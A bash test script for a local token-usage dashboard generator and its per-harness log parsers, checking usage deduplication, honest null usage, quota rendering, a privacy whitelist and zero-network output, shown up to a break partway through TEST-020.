#!/usr/bin/env bash
#
# Test: aai-live-status
# (docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md, TEST-001..020, 024..036)
#
# Verifies .aai/scripts/generate-live-status.mjs — the optional, zero-token,
# zero-network live-status dashboard generator — plus its per-harness parser
# registry (.aai/scripts/live-parsers/{registry,claude-code,codex,gemini-cli}.mjs),
# the statusline/hook tap writer (.aai/scripts/live-spool.sh), and the
# convenience launcher (.aai/scripts/aai-live.sh).
#
# ALL fixtures are scratch temp-dir "home" directories standing in for
# os.homedir() via --home / --spool-dir / --cache — the real ~/.claude,
# ~/.codex, ~/.gemini and the real docs/ai/ tree are NEVER touched (except
# TEST-019's SEAM2 fixture, itself a scratch git repo, never the real repo).
#
# TEST-021 (layer-profiles), TEST-022 (hygiene-pack suite-map row) and
# TEST-023 (ps1-quality) are owned by their existing suites, not this file.
#
# bash 3.2 compatible (no ${var^^}, no declare -A).
#
# Usage:
#   bash tests/skills/test-aai-live-status.sh                 # run all
#   bash tests/skills/test-aai-live-status.sh test_004_claude_code_dedup
#
# Exit codes: 0 pass | 1 fail | 42 skipped (missing deps)

set -euo pipefail

TEST_NAME="aai-live-status"
TEST_DIR=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
GEN="$PROJECT_ROOT/.aai/scripts/generate-live-status.mjs"
SPOOL="$PROJECT_ROOT/.aai/scripts/live-spool.sh"
LIVE="$PROJECT_ROOT/.aai/scripts/aai-live.sh"
REGISTRY="$PROJECT_ROOT/.aai/scripts/live-parsers/registry.mjs"
CLAUDE_PARSER="$PROJECT_ROOT/.aai/scripts/live-parsers/claude-code.mjs"
CODEX_PARSER="$PROJECT_ROOT/.aai/scripts/live-parsers/codex.mjs"
GEMINI_PARSER="$PROJECT_ROOT/.aai/scripts/live-parsers/gemini-cli.mjs"
NOW="2026-08-08T12:00:00.000Z"

cleanup() {
  if [[ -n "${KEEP_TEST_DIR:-}" ]]; then echo "INFO: keeping fixture at $TEST_DIR"; return 0; fi
  if [[ -n "${TEST_DIR:-}" && -d "$TEST_DIR" ]]; then rm -rf "$TEST_DIR"; fi
}
trap cleanup EXIT

log_pass() { echo "PASS: $*"; }
log_fail() { echo "FAIL: $*" >&2; exit 1; }
log_skip() { echo "SKIP: $*"; exit 42; }
log_info() { echo "INFO: $*"; }

check_deps() {
  log_info "Checking dependencies..."
  command -v node >/dev/null 2>&1 || log_skip "node not found"
  [[ -f "$GEN" ]] || log_fail "generate-live-status.mjs not found: $GEN"
  [[ -f "$SPOOL" ]] || log_fail "live-spool.sh not found: $SPOOL"
  [[ -f "$LIVE" ]] || log_fail "aai-live.sh not found: $LIVE"
  log_pass "Dependencies checked"
}

setup_fixture() { TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/aai-live-status-test.XXXXXX")"; }

mk_home() {  # mk_home <name> -> echoes fresh empty home dir
  local d="$TEST_DIR/$1"
  rm -rf "$d"
  mkdir -p "$d"
  printf '%s' "$d"
}

# --- output helpers -----------------------------------------------------------

OUT=""; EC=0; DATA=""; HTML=""
run_gen() {  # run_gen <home> [extra args...]
  local home="$1"; shift || true
  mkdir -p "$home/out"
  OUT="$home/gen-run.log"
  DATA="$home/out/live-status-data.json"
  HTML="$home/out/live-status.html"
  EC=0
  node "$GEN" --home "$home" --output "$HTML" --cache "$home/cache.json" \
    --spool-dir "$home/spool" --now "$NOW" "$@" > "$OUT" 2>&1 || EC=$?
}

node_get() {  # node_get <json-file> <expr-using-m>
  node -e '
    const fs=require("fs"); const m=JSON.parse(fs.readFileSync(process.argv[1],"utf8"));
    const expr=process.argv[2]; process.stdout.write(String(eval(expr)));
  ' "$1" "$2"
}

spool_line() {  # spool_line <home> <kind> <json>
  local home="$1" kind="$2" json="$3"
  mkdir -p "$home/spool"
  printf '%s' "$json" | AAI_LIVE_SPOOL_DIR="$home/spool" bash "$SPOOL" "$kind" >/dev/null
}

# ============================ TEST-001 (Spec-AC-01) ===========================
test_001_run_writes_both_outputs() {
  log_info "Test: a run against a fixture home writes both output files and exits 0..."
  local h; h="$(mk_home t001)"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  [[ -f "$DATA" ]] || log_fail "data JSON missing: $DATA"
  [[ -f "$HTML" ]] || log_fail "html missing: $HTML"
  log_pass "TEST-001: both output files written, exit 0"
}

# ============================ TEST-002 (Spec-AC-01) ===========================
test_002_absent_home_all_absent() {
  log_info "Test: a home with no harness directory at all exits 0 and lists all three harnesses ABSENT..."
  local h; h="$(mk_home t002)"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local n; n="$(node_get "$DATA" 'm.degraded.length')"
  [[ "$n" == "3" ]] || log_fail "expected 3 degraded entries, got $n"
  [[ "$(node_get "$DATA" 'm.degraded.every(d=>/^ABSENT:/.test(d.reason))')" == "true" ]] || log_fail "every degraded reason must start with ABSENT:"
  local ids; ids="$(node_get "$DATA" 'm.degraded.map(d=>d.source).sort().join(",")')"
  [[ "$ids" == "claude-code,codex,gemini-cli" ]] || log_fail "expected all three harness ids, got: $ids"
  # Honesty invariant: an ABSENT harness dir means the spend is UNKNOWN, not a
  # verified zero. usage_today/usage_7d must be null, never a fabricated 0.
  [[ "$(node_get "$DATA" 'm.harnesses.every(h=>h.usage_today===null && h.usage_7d===null)')" == "true" ]] \
    || log_fail "every ABSENT harness must report usage_today/usage_7d as null, never 0"
  log_pass "TEST-002: absent home -> exit 0, all three harnesses ABSENT, usage null not 0"
}

# ============================ TEST-003 (Spec-AC-01) ===========================
test_003_no_network_imports() {
  log_info "Test: generator and parser sources import only node builtins, no http/https/fetch/net..."
  local f
  for f in "$GEN" "$CLAUDE_PARSER" "$CODEX_PARSER" "$GEMINI_PARSER" "$REGISTRY"; do
    if grep -Eq "require\(['\"](http|https|net|dgram|tls|dns)['\"]\)|from ['\"](node:)?(http|https|net|dgram|tls|dns)['\"]|[^A-Za-z_.]fetch\(|XMLHttpRequest" "$f"; then
      log_fail "network reference found in $f"
    fi
  done
  log_pass "TEST-003: no network imports/calls in generator or parser sources"
}

# ============================ TEST-004 (Spec-AC-02) ===========================
test_004_claude_code_dedup() {
  log_info "Test: a Claude Code fixture containing the same assistant line twice counts its usage exactly once..."
  local h; h="$(mk_home t004)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":100,"output_tokens":50,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":100,"output_tokens":50,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage" == "150" ]] || log_fail "expected deduped usage_today=150 (100+50 once), got $usage"
  log_pass "TEST-004: duplicated Claude Code assistant line counted once (150 not 300)"
}

# ============================ TEST-005 (Spec-AC-02) ===========================
test_005_codex_cumulative_last() {
  log_info "Test: a Codex fixture with three token_count events reports the last cumulative total, not their sum..."
  local h; h="$(mk_home t005)"
  mkdir -p "$h/.codex/sessions/2026/08/08"
  cat > "$h/.codex/sessions/2026/08/08/rollout-1-abc.jsonl" <<'JSONL'
{"type":"session_meta","timestamp":"2026-08-08T09:00:00.000Z","payload":{"session_id":"cx1","cwd":"/x/codexproj"}}
{"type":"event_msg","timestamp":"2026-08-08T09:01:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":10,"output_tokens":5,"cached_input_tokens":0}}}}
{"type":"event_msg","timestamp":"2026-08-08T09:02:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":20,"output_tokens":10,"cached_input_tokens":0}}}}
{"type":"event_msg","timestamp":"2026-08-08T09:03:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":30,"output_tokens":15,"cached_input_tokens":0}}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='codex')||{}).usage_today")"
  # LAST event total = 30+15 = 45. Sum of all three would be 10+5+20+10+30+15=90.
  [[ "$usage" == "45" ]] || log_fail "expected last-cumulative usage_today=45 (not the 90-token sum), got $usage"
  log_pass "TEST-005: Codex reports the last cumulative total (45), never the sum (90)"
}

# ============================ TEST-006 (Spec-AC-02) ===========================
test_006_registry_refuses_malformed_entry() {
  log_info "Test: a registry entry missing a required contract field is refused with a named error..."
  local msg
  msg="$(node -e '
    import(process.argv[1]).then((mod) => {
      try {
        mod.registerParsers([{ id: "broken", roots: () => [], discover: () => [], parse: function* () {} }]);
        console.log("NO_THROW");
      } catch (e) {
        console.log("THROW:" + e.message);
      }
    });
  ' "$REGISTRY" 2>&1)"
  [[ "$msg" == THROW:* ]] || log_fail "expected a thrown named error, got: $msg"
  echo "$msg" | grep -q "accumulation" || log_fail "error must name the missing field (accumulation): $msg"
  log_pass "TEST-006: malformed registry entry refused with a named error: $msg"
}

# ============================ TEST-007 (Spec-AC-03) ============================
test_007_incremental_cutoff_unchanged() {
  log_info "Test: a second run over an unchanged corpus skips every session file, byte-identical aggregates..."
  local h; h="$(mk_home t007)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "cold run must exit 0: $(cat "$OUT")"
  local cold; cold="$(node_get "$DATA" "JSON.stringify(m.harnesses)")"
  local coldFiles; coldFiles="$(node_get "$DATA" 'm.scan.files_total')"

  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "warm run must exit 0: $(cat "$OUT")"
  local skipped; skipped="$(node_get "$DATA" 'm.scan.files_skipped_unchanged')"
  local warmFiles; warmFiles="$(node_get "$DATA" 'm.scan.files_total')"
  [[ "$skipped" == "$warmFiles" ]] || log_fail "expected files_skipped_unchanged ($skipped) == files_total ($warmFiles)"
  [[ "$warmFiles" == "$coldFiles" ]] || log_fail "corpus file count changed between runs: $coldFiles vs $warmFiles"
  local warm; warm="$(node_get "$DATA" "JSON.stringify(m.harnesses)")"
  [[ "$cold" == "$warm" ]] || log_fail "harness aggregates must be byte-identical across cold/warm runs"
  log_pass "TEST-007: unchanged corpus fully skipped on re-run, aggregates byte-identical"
}

# ============================ TEST-008 (Spec-AC-03) ============================
test_008_incremental_cutoff_appended() {
  log_info "Test: appending one line to one session file re-reads exactly that file and updates only its totals..."
  local h; h="$(mk_home t008)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  cat > "$h/.claude/projects/proj/s2.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s2","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"reqA","message":{"id":"msgA","model":"m","usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "cold run must exit 0: $(cat "$OUT")"

  sleep 1  # ensure a distinct mtime on the append (1s mtime resolution on some fs)
  cat >> "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:05:00.000Z","requestId":"req2","message":{"id":"msg2","model":"m","usage":{"input_tokens":100,"output_tokens":0,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "warm run must exit 0: $(cat "$OUT")"
  local read_n; read_n="$(node_get "$DATA" 'm.scan.files_read')"
  local skipped_n; skipped_n="$(node_get "$DATA" 'm.scan.files_skipped_unchanged')"
  [[ "$read_n" == "1" ]] || log_fail "expected exactly 1 file re-read, got $read_n"
  [[ "$skipped_n" == "1" ]] || log_fail "expected exactly 1 file skipped (s2 unchanged), got $skipped_n"
  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  # s1: 15 + 100 = 115; s2: 2 -> total 117
  [[ "$usage" == "117" ]] || log_fail "expected updated total usage_today=117, got $usage"
  log_pass "TEST-008: appended file re-read exactly once, only its totals updated"
}

# ============================ TEST-009 (Spec-AC-04) ============================
test_009_gemini_usage_na() {
  log_info "Test: a Gemini CLI logs.json fixture yields usage null, rendered N/A, never a zero or estimate..."
  local h; h="$(mk_home t009)"
  mkdir -p "$h/.gemini/tmp/otherproj"
  cat > "$h/.gemini/tmp/otherproj/logs.json" <<'JSONL'
[{"sessionId":"g1","messageId":"m1","type":"user","message":"hi","timestamp":"2026-08-08T08:00:00.000Z"}]
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local today; today="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='gemini-cli')||{}).usage_today")"
  local d7; d7="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='gemini-cli')||{}).usage_7d")"
  [[ "$today" == "null" ]] || log_fail "gemini usage_today must be null, got $today"
  [[ "$d7" == "null" ]] || log_fail "gemini usage_7d must be null, got $d7"
  grep -q "gemini-cli" "$HTML" || log_fail "html must mention gemini-cli chip"
  # The spend tables carry an explicit gemini-cli row so the page can render
  # its N/A cell — the JSON stays honest with tokens: null (never a fabricated
  # 0, never a string), the row is simply never omitted.
  [[ "$(node_get "$DATA" "m.spend.today.some(s=>s.harness==='gemini-cli' && s.tokens===null)")" == "true" ]] \
    || log_fail "gemini-cli must appear in spend.today with tokens: null (never omitted, never a number)"
  [[ "$(node_get "$DATA" "m.spend.today.every(s=>s.harness!=='gemini-cli' || s.tokens===null)")" == "true" ]] \
    || log_fail "gemini-cli must never carry a numeric spend.today figure"
  [[ "$(node_get "$DATA" "m.spend.seven_day.some(s=>s.harness==='gemini-cli' && s.tokens===null)")" == "true" ]] \
    || log_fail "gemini-cli must appear in spend.seven_day with tokens: null"
  # Rendered page: Spec-AC-04's named observable is the literal N/A cell, not
  # just an honest null in the JSON — assert it actually reached the page.
  grep -q "N/A" "$HTML" || log_fail "html must render at least one N/A usage cell for the no-usage harness (Spec-AC-04)"
  log_pass "TEST-009: Gemini usage is null end-to-end, JSON null + rendered N/A, never a fabricated zero"
}

# ============================ TEST-010 (Spec-AC-04) ============================
test_010_all_parsers_reachable() {
  log_info "Test: all three parsers are reachable through the registry, each reports its own root and availability..."
  local h; h="$(mk_home t010)"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local ids; ids="$(node_get "$DATA" 'm.harnesses.map(h=>h.id).sort().join(",")')"
  [[ "$ids" == "claude-code,codex,gemini-cli" ]] || log_fail "expected all three harness ids, got: $ids"
  [[ "$(node_get "$DATA" 'm.harnesses.every(h=>typeof h.root==="string" && h.root.length>0)')" == "true" ]] || log_fail "every harness must report a non-empty root"
  [[ "$(node_get "$DATA" 'm.harnesses.every(h=>typeof h.available==="boolean")')" == "true" ]] || log_fail "every harness must report a boolean availability"
  log_pass "TEST-010: all three parsers reachable, each reports root + availability"
}

# ============================ TEST-011 (Spec-AC-06, SEAM 1) ====================
test_011_seam_tap_quotas_render() {
  log_info "Test: SEAM 1 — a statusline payload piped through live-spool.sh renders quotas in the page..."
  local h; h="$(mk_home t011)"
  spool_line "$h" statusline '{"session_id":"s1","cwd":"/x","model":"m","rate_limits":{"five_hour":{"used_percent":33,"resets_at":"2026-08-08T15:00:00Z"},"seven_day":{"used_percent":12,"resets_at":"2026-08-14T00:00:00Z"}}}'
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  [[ "$(node_get "$DATA" 'm.quotas.source')" == "tap" ]] || log_fail "quotas source must be tap"
  [[ "$(node_get "$DATA" 'm.quotas.five_hour.used_percent')" == "33" ]] || log_fail "five_hour used_percent must be 33"
  [[ "$(node_get "$DATA" 'm.quotas.seven_day.used_percent')" == "12" ]] || log_fail "seven_day used_percent must be 12"
  [[ "$(node_get "$DATA" 'm.quotas.seven_day.resets_at')" == "2026-08-14T00:00:00Z" ]] || log_fail "resets_at must round-trip"
  grep -q "33%" "$HTML" || log_fail "html must render the five_hour 33% figure"
  grep -q "12%" "$HTML" || log_fail "html must render the seven_day 12% figure"
  log_pass "TEST-011: SEAM 1 tap payload renders five_hour/seven_day used%% and resets_at"
}

# ============================ TEST-012 (Spec-AC-06) ============================
test_012_quotas_skip_no_tap() {
  log_info "Test: with no tap spool, quotas SKIP names the absent spool and install command, no percentage figure..."
  local h; h="$(mk_home t012)"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  [[ "$(node_get "$DATA" 'm.quotas.source')" == "null" ]] || log_fail "quotas source must be null when no tap/session data exists"
  [[ "$(node_get "$DATA" 'typeof m.quotas.skip')" == "object" ]] || log_fail "quotas.skip must be present"
  echo "$(node_get "$DATA" 'm.quotas.skip.reason')" | grep -qi "spool" || log_fail "skip reason must name the absent spool"
  echo "$(node_get "$DATA" 'm.quotas.skip.install')" | grep -q "live-spool.sh" || log_fail "skip install hint must name live-spool.sh"
  # Isolate the quotas section of the page and assert it carries no % figure.
  local quotasSection
  quotasSection="$(node -e '
    const fs=require("fs"); const h=fs.readFileSync(process.argv[1],"utf8");
    const s=h.indexOf("Official quotas"); const e=h.indexOf("Live sessions");
    process.stdout.write(h.slice(s, e>s?e:h.length));
  ' "$HTML")"
  echo "$quotasSection" | grep -q "SKIP" || log_fail "quotas section must render the word SKIP"
  if echo "$quotasSection" | grep -q "%"; then log_fail "quotas section must render no percentage figure when skipped"; fi
  log_pass "TEST-012: quotas SKIP names the absent spool + install command, no percentage figure"
}

# ============================ TEST-013 (Spec-AC-06) ============================
test_013_codex_session_rate_limits() {
  log_info "Test: a Codex fixture carrying rate limits renders them attributed to the codex harness..."
  local h; h="$(mk_home t013)"
  mkdir -p "$h/.codex/sessions/2026/08/08"
  cat > "$h/.codex/sessions/2026/08/08/rollout-1-abc.jsonl" <<'JSONL'
{"type":"session_meta","timestamp":"2026-08-08T09:00:00.000Z","payload":{"session_id":"cx1","cwd":"/x/codexproj"}}
{"type":"event_msg","timestamp":"2026-08-08T09:02:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":20,"output_tokens":10,"cached_input_tokens":0}},"rate_limits":{"primary":{"used_percent":42,"window_minutes":300,"resets_at":"2026-08-08T14:00:00.000Z"}}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  [[ "$(node_get "$DATA" 'm.quotas.source')" == "session:codex" ]] || log_fail "quotas source must be session:codex"
  [[ "$(node_get "$DATA" 'm.quotas.primary.used_percent')" == "42" ]] || log_fail "primary.used_percent must be 42"
  [[ "$(node_get "$DATA" 'm.quotas.primary.window_minutes')" == "300" ]] || log_fail "primary.window_minutes must be 300"
  [[ "$(node_get "$DATA" 'm.quotas.primary.resets_at')" == "2026-08-08T14:00:00.000Z" ]] || log_fail "primary.resets_at must round-trip"
  grep -q "codex" "$HTML" || log_fail "html must attribute the quota to codex"
  log_pass "TEST-013: Codex in-session rate limits attributed to codex with window + reset time"
}

# ============================ TEST-014 (Spec-AC-06, SEAM 1) ====================
test_014_seam_tap_whitelist() {
  log_info "Test: SEAM 1 — a payload carrying transcript_path and message is never spooled, whitelist holds..."
  local h; h="$(mk_home t014)"
  spool_line "$h" statusline '{"session_id":"s1","cwd":"/x","model":"m","transcript_path":"/secret/transcript.jsonl","message":"hello secret content","rate_limits":{"five_hour":{"used_percent":5,"resets_at":"z"}}}'
  [[ -f "$h/spool/statusline.jsonl" ]] || log_fail "spool file must be written"
  grep -q "transcript_path" "$h/spool/statusline.jsonl" && log_fail "transcript_path must never be spooled"
  grep -q "secret content" "$h/spool/statusline.jsonl" && log_fail "message must never be spooled"
  grep -q "session_id" "$h/spool/statusline.jsonl" || log_fail "whitelisted session_id must be spooled"
  grep -q "rate_limits" "$h/spool/statusline.jsonl" || log_fail "whitelisted rate_limits must be spooled"
  log_pass "TEST-014: SEAM 1 whitelist drops transcript_path/message, keeps declared keys only"
}

# ============================ TEST-015 (Spec-AC-07) ============================
test_015_liveness_hooks_and_heuristic() {
  log_info "Test: Stop/Notification hook lines produce finished/waiting-on-approval; no line -> mtime heuristic..."
  local h; h="$(mk_home t015)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r1","message":{"id":"m1","model":"m","usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
{"type":"assistant","sessionId":"s2","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r2","message":{"id":"m2","model":"m","usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
{"type":"assistant","sessionId":"s3","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r3","message":{"id":"m3","model":"m","usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  spool_line "$h" hooks '{"session_id":"s1","hook_event_name":"Stop"}'
  spool_line "$h" hooks '{"session_id":"s2","hook_event_name":"Notification"}'
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  [[ "$(node_get "$DATA" "(m.live_sessions.find(s=>s.sessionId==='s1')||{}).state")" == "finished" ]] || log_fail "s1 must be finished"
  [[ "$(node_get "$DATA" "(m.live_sessions.find(s=>s.sessionId==='s2')||{}).state")" == "waiting-on-approval" ]] || log_fail "s2 must be waiting-on-approval"
  local s3state; s3state="$(node_get "$DATA" "(m.live_sessions.find(s=>s.sessionId==='s3')||{}).state")"
  echo "$s3state" | grep -q "heuristic" || log_fail "s3 (no spool line) must carry the literal word heuristic, got: $s3state"
  log_pass "TEST-015: hook-derived finished/waiting-on-approval badges; no-line session carries heuristic"
}

# ============================ TEST-016 (Spec-AC-08, SEAM 5) ====================
test_016_never_coupled_to_ride() {
  log_info "Test: SEAM 5 — close-work-item.mjs, autonomous-loop.sh, session-start.sh, workflows never reference generate-live-status..."
  local hits=0
  local f
  for f in "$PROJECT_ROOT/.aai/scripts/close-work-item.mjs" \
           "$PROJECT_ROOT/.aai/scripts/autonomous-loop.sh" \
           "$PROJECT_ROOT/hooks/session-start.sh"; do
    [[ -f "$f" ]] || continue
    if grep -q "generate-live-status" "$f"; then
      log_info "unexpected reference in $f"
      hits=1
    fi
  done
  if [[ -d "$PROJECT_ROOT/.github/workflows" ]]; then
    if grep -rl "generate-live-status" "$PROJECT_ROOT/.github/workflows" >/dev/null 2>&1; then
      log_info "unexpected reference under .github/workflows"
      hits=1
    fi
  fi
  [[ "$hits" == 0 ]] || log_fail "generate-live-status must never be referenced by a ride-path surface"
  log_pass "TEST-016: SEAM 5 — zero ride-path references to generate-live-status"
}

# ============================ TEST-017 (Spec-AC-08) ============================
test_017_product_doc_install_uninstall() {
  log_info "Test: the product doc documents install and uninstall for the tap and the hooks..."
  local doc="$PROJECT_ROOT/docs/product/live-status-dashboard.md"
  [[ -f "$doc" ]] || log_fail "product doc not found: $doc"
  grep -qi "install" "$doc" || log_fail "product doc must document install"
  grep -qi "uninstall" "$doc" || log_fail "product doc must document uninstall"
  grep -q "live-status-hooks.json" "$doc" || log_fail "product doc must reference the hooks overlay"
  grep -qi "statusline" "$doc" || log_fail "product doc must document the statusline tap"
  node -e '
    import(process.argv[1]).then(async (mod) => {
      const missing = mod.missingProductSections(require("fs").readFileSync(process.argv[2], "utf8"));
      if (missing.length) { console.error("MISSING:" + missing.join(",")); process.exit(1); }
      process.exit(0);
    }).catch((e) => { console.error("ERR:" + e.message); process.exit(1); });
  ' "$PROJECT_ROOT/.aai/scripts/lib/product-doc.mjs" "$doc" \
    || log_fail "product doc fails the D2 placeholder predicate (missingProductSections)"
  log_pass "TEST-017: product doc documents install/uninstall and passes the placeholder predicate"
}

# ============================ TEST-018 (Spec-AC-10, SEAM 3) ====================
test_018_seam_html_matches_data() {
  log_info "Test: SEAM 3 — every KPI in the page equals the same field in the data JSON, no external/network ref..."
  local h; h="$(mk_home t018)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r1","message":{"id":"m1","model":"m","usage":{"input_tokens":7,"output_tokens":3,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage" == "10" ]] || log_fail "expected usage_today=10, got $usage"
  grep -q ">10<" "$HTML" || log_fail "html must render the exact spend figure (10) matching the data JSON"
  # BLOCKING-1 fix: the old guard was `grep -qi "<script "` (trailing space),
  # which never matches the common `<script>` / `<script src=...>` forms —
  # it would not have caught the actual injection this suite ships against
  # in TEST-030. Match the tag with no trailing-space assumption.
  grep -qi "<script" "$HTML" && log_fail "html must carry no <script> tag (no external/network reference)"
  grep -qi "http://" "$HTML" && log_fail "html must carry no http:// reference"
  grep -qi "https://" "$HTML" && log_fail "html must carry no https:// reference"
  log_pass "TEST-018: SEAM 3 — HTML KPI matches data JSON exactly, no external/network reference"
}

# ============================ TEST-019 (Spec-AC-11, SEAM 2) ====================
test_019_seam_git_and_docs_audit_clean() {
  log_info "Test: SEAM 2 — after a generator run, git status --porcelain and docs-audit report nothing/no non-canon entry..."
  command -v git >/dev/null 2>&1 || log_skip "git not found"
  local d="$TEST_DIR/t019repo"
  mkdir -p "$d/.aai/system"
  cp "$PROJECT_ROOT/.aai/system/DOCS_AI_CANON.list" "$d/.aai/system/DOCS_AI_CANON.list"
  cp "$PROJECT_ROOT/.gitignore" "$d/.gitignore"
  git init -q -b main "$d" 2>/dev/null || git -c init.defaultBranch=main init -q "$d"
  git -C "$d" config user.email test@example.com
  git -C "$d" config user.name test
  git -C "$d" add -A
  git -C "$d" commit -q -m init >/dev/null
  # docs/ai/ itself is deliberately NOT committed here (an untracked empty dir
  # is invisible to git and to the non-canon scan alike) — only the generator's
  # writes into it are under test.

  local home; home="$(mk_home t019home)"
  node "$GEN" --home "$home" --output "$d/docs/ai/live-status.html" --cache "$d/cache.json" \
    --spool-dir "$d/docs/ai/live" --now "$NOW" > "$d/gen.log" 2>&1 || log_fail "generator must exit 0: $(cat "$d/gen.log")"
  spool_line "$home" statusline '{"session_id":"s1"}'
  cp "$home/spool/statusline.jsonl" "$d/docs/ai/live/statusline.jsonl" 2>/dev/null || true
  mkdir -p "$d/docs/ai/live"
  : > "$d/docs/ai/live/statusline.jsonl"

  local porcelain; porcelain="$(git -C "$d" status --porcelain -- docs/ai)"
  [[ -z "$porcelain" ]] || log_fail "git status --porcelain must report nothing under docs/ai, got: $porcelain"

  local noncanon
  noncanon="$(node -e '
    import(process.argv[1]).then((mod) => {
      const res = mod.docsAiNonCanonFor(process.argv[2], {});
      console.log(JSON.stringify(res));
    });
  ' "$PROJECT_ROOT/.aai/scripts/lib/docs-audit-core.mjs" "$d")"
  [[ "$noncanon" == "[]" ]] || log_fail "docs-audit must report no docs/ai non-canonical entry, got: $noncanon"
  log_pass "TEST-019: SEAM 2 — git status clean and docs-audit reports no non-canonical docs/ai entry"
}

# ============================ TEST-020 (Spec-AC-05) ============================
test_020_no_hardcoded_home() {
  log_info "Test: no hardcoded home path string; every root built via os.homedir + path.join; degraded names location..."
  local f
  for f in "$CLAUDE_PARSER" "$CODEX_PARSER" "$GEMINI_PARSER" "$GEN"; do
    if grep -Eq "/Users/[A-Za-z]|/home/[A-Za-z]|C:\\\\\\\\Users" "$f"; then
      log_fail "hardcoded home-like path string found in $f"
    fi
  done
  for f in "$CLAUDE_PARSER" "$CODEX_PARSER" "$GEMINI_PARSER"; do
    grep -q "os.homedir()" "$f" || log_fail "$f must build its root via os.homedir()"
    grep -q "path.join" "$f" || log_fail "$f must join its root via path.join"
  done
  local h; h="$(mk_home t020)"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
